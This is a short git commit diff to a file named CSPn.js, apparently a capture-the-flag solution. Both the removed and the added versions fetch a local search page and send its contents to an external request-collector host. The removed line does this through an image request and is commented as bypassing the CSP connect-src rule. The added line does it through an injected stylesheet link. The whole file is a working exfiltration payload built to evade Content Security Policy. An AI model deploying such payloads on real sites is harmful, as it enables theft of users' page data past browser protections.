e4630141686d53b9981e3a4a8182db50262ce83b
jbbok89 <jbbok89@gmail.com>
2025-11-29 02:05:10 +0900

    Update CSPn.js

--- CSPn.js
+++ CSPn.js
@@ -1,4 +1,1 @@
-fetch("http://127.0.0.1:12001/search?query=scpCTF").then(res=>res.text()).then(text=>{
-    // 💡 new Image() 방식: CSP connect-src를 효과적으로 우회합니다.
-    new Image().src = 'https://bfgtjrh.request.dreamhack.games/?data=' + encodeURIComponent(text);
-});
+fetch("http://127.0.0.1:12001/search?query=scpCTF").then(res=>res.text()).then(text=>{const l=document.createElement('link');l.rel='stylesheet';l.href="https://bfgtjrh.request.dreamhack.games/?data="+encodeURIComponent(text);document.head.appendChild(l);});
